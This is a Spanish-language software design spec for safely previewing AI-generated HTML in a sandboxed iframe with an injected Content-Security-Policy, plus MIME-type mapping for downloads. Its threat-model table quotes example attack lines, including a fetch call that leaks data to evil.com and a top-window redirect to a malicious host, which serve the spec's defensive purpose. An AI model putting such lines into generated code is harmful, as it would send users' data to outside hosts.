---
created: 2026-11-08
updated: 2026-11-08
type: spec
phase: 7
layer: presentation
status: implemented
category: meta-project
tags: [sdd, security, html-preview, sandbox, csp, mime-types]
---

# SDD: Previsualización Segura de HTML5 en Sandbox y Manejo Dinámico de Tipos MIME

## 1. Contexto y Objetivos

Con la incorporación de **Fídias** (diseñador UX/UI) y **Dédalo** (desarrollador Full-Stack), el sistema genera frecuentemente maquetaciones completas en HTML5, CSS y JavaScript (páginas web, landings, mockups y dashboards interactivos).

### Problemas Detectados
1. **Descargas en Móvil como Texto Plano (`text/plain`):**
   - Al descargar un archivo `.html` desde el móvil (iOS o Android), el archivo se creaba en memoria con el tipo MIME rígido `text/plain;charset=utf-8`.
   - Los sistemas operativos móviles (especialmente iOS QuickLook y Android Files) priorizan el tipo MIME sobre la extensión del archivo, abriéndolo siempre como texto plano o código fuente en lugar de como una página web interactiva.
2. **Ausencia de Previsualización Interactiva Inmediata:**
   - Para ver la web maquetada por Fídias, el usuario debía descargar el archivo, salir de Atenea, buscarlo en la app de Archivos y luchar con el visor del móvil.
3. **Riesgo de Seguridad en Previsualizaciones de Código (XSS & Fuga de Datos):**
   - El código HTML/JS generado por agentes de IA puede contener scripts ejecutables. Si se renderiza de forma ingenua (`v-html` o `iframe` sin sandbox en el mismo origen), un script malicioso podría:
     - Leer tokens de sesión, `localStorage` o cookies de Atenea.
     - Interceptar la sesión de chat o el WebSocket.
     - Ejecutar peticiones silenciosas (`fetch`/XHR) hacia las APIs internas del sistema.

### Objetivos Clave
1. **Mapeo Dinámico de Tipos MIME (`mimeHelper.ts`):** Asignar automáticamente el tipo MIME adecuado según la extensión del archivo (`text/html;charset=utf-8` para `.html`, `image/svg+xml` para `.svg`, `application/json` para `.json`, etc.) tanto en `ChatPanel.vue` como en `CodeModal.vue`.
2. **Previsualización Interactiva Integrada en `CodeModal.vue`:** Pestaña dual `[Vista Previa]` y `[Código Fuente]` cuando el artefacto sea HTML/HTM, permitiendo probar la web interactiva sin salir de Atenea.
3. **Sandbox Hermético de Nivel Enterprise (Zero-Risk):**
   - Atributo `sandbox="allow-scripts"` sin `allow-same-origin` (origen opaco `null` que bloquea cookies, storage y acceso al DOM del padre).
   - Inyección automática de Content-Security-Policy (CSP) restrictivo: `default-src 'self' 'unsafe-inline' data: https:; connect-src 'none'; object-src 'none'; base-uri 'none';` para impedir llamadas de red exfiltrativas.
   - Bloqueo de redirecciones de la ventana principal (`no allow-top-navigation`).

---

## 2. Arquitectura de la Solución

```mermaid
flowchart TD
    subgraph UserAction ["Interacción de Usuario"]
        A[Clic en 'Ver' / 'Descargar' código en ChatPanel o CodeModal]
    end

    subgraph MimeResolution ["Resolución de Tipo MIME"]
        A -->|Descargar| B[getMimeTypeForExtension / mimeHelper.ts]
        B -->|html/htm| C[Blob con text/html;charset=utf-8]
        B -->|svg| D[Blob con image/svg+xml;charset=utf-8]
        B -->|json| E[Blob con application/json;charset=utf-8]
        B -->|otros| F[Blob con text/plain;charset=utf-8]
        C --> G[Descarga en móvil asociada al navegador web]
    end

    subgraph SecurePreview ["Previsualización Segura en CodeModal.vue"]
        A -->|Ver Maquetación HTML| H[Detección de lenguaje HTML]
        H --> I[Pestañas: Vista Previa | Código Fuente]
        I -->|Pestaña Vista Previa| J[prepareSandboxedHtml / mimeHelper.ts]
        J --> K[Inyección de Meta CSP: connect-src 'none']
        K --> L["iframe sandbox='allow-scripts' (sin allow-same-origin)"]
        L --> M[Renderizado interactivo seguro: carruseles y CSS funcionando]
    end
```

---

## 3. Modelo de Amenazas y Mitigaciones de Seguridad

| Vector de Ataque | Riesgo | Mitigación Implementada |
| :--- | :--- | :--- |
| **Robo de Credenciales (XSS)** | Acceso a `localStorage`, `sessionStorage` o cookies de Atenea desde JS generado. | `sandbox="allow-scripts"` **sin** `allow-same-origin`. El navegador fuerza un origen `null`. Cualquier intento de acceso a storage arroja `SecurityError`. |
| **Secuestro de la App (Clickjacking / Top Navigation)** | Un script en el HTML hace `window.top.location = 'http://malicioso.com'`. | Se omite `allow-top-navigation`. El iframe no puede redirigir la pestaña de Atenea. |
| **Manipulación del DOM Padre** | Acceso a `window.parent.document` para leer conversaciones o inyectar texto. | Bloqueado por la política Same-Origin del motor del navegador al estar en `null origin`. |
| **Exfiltración de Datos por Red** | Script ejecutando `fetch('https://evil.com?leak=' + data)` o WebSockets ocultos. | Meta CSP estricto inyectado en el `<head>`: `connect-src 'none'`. El navegador rechaza cualquier conexión saliente de red originada en el iframe. |
| **Apertura de Modales o Popups No Deseados** | Bucle infinito de `alert()` o `window.open()`. | Se omiten `allow-modals` y `allow-popups`. |

---

## 4. Especificación Técnica por Capas

### A. Capa de Utilidades (`frontend/src/utils/mimeHelper.ts`)
1. **`getMimeTypeForExtension(extension?: string): string`:**
   - Mapea extensiones estándar a tipos MIME oficiales con codificación UTF-8.
2. **`prepareSandboxedHtml(rawHtml: string): string`:**
   - Inyecta en el `<head>` (o al principio si no existe) la etiqueta:
     ```html
     <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' data: https:; connect-src 'none'; object-src 'none'; base-uri 'none';">
     ```
   - Garantiza que cualquier enlace dentro del iframe no pueda redirigir la ventana del usuario.

### B. Componente Modal de Código (`frontend/src/components/tools/CodeModal.vue`)
- **Prop reactiva `isHtml`:** Detecta si `effectiveExtension` es `html` o `htm` (o `language` es `html`/`htm`).
- **Pestaña interactiva:**
  - `Vista Previa`: Activa por defecto cuando el artefacto es HTML.
  - `Código Fuente`: Vista de código con líneas numeradas y sintaxis limpia.
- **Iframe de Renderizado:**
  - `:srcdoc="sandboxedHtml"`
  - `sandbox="allow-scripts"`
  - Estilos de contenedor con fondo blanco neutro (`bg-white`), bordes redondeados y sombra interna para simular una ventana de navegador.

### C. Descargas en `ChatPanel.vue` y `CodeModal.vue`
- Sustitución de `new Blob([code], { type: 'text/plain;charset=utf-8' })` por:
  ```typescript
  const mimeType = getMimeTypeForExtension(ext)
  const blob = new Blob([code], { type: mimeType })
  ```

---

## 5. Estrategia de Pruebas (TDD)

### Frontend Tests
1. **`frontend/src/utils/__tests__/mimeHelper.spec.ts`:**
   - Comprueba que `.html` y `.htm` devuelven `text/html;charset=utf-8`.
   - Comprueba que `.svg`, `.json`, `.md`, `.js`, `.css` devuelven sus tipos MIME correspondientes.
   - Comprueba que extensiones desconocidas caen en `text/plain;charset=utf-8`.
   - Verifica que `prepareSandboxedHtml()` inyecta el meta CSP con `connect-src 'none'`.
2. **`frontend/src/components/tools/__tests__/CodeModal.spec.ts`:**
   - Verifica que cuando el artefacto es HTML, se renderizan las pestañas `Vista Previa` y `Código Fuente`.
   - Comprueba que el iframe tiene el atributo `sandbox="allow-scripts"` y **carece** de `allow-same-origin`.
   - Comprueba que `srcdoc` contiene la política CSP inyectada.
   - Verifica que la descarga utiliza el MIME type dinámico adecuado.
3. **`frontend/src/components/__tests__/ChatPanel.spec.ts`:**
   - Verifica que la descarga de código desde la tarjeta del chat usa el tipo MIME dinámico.

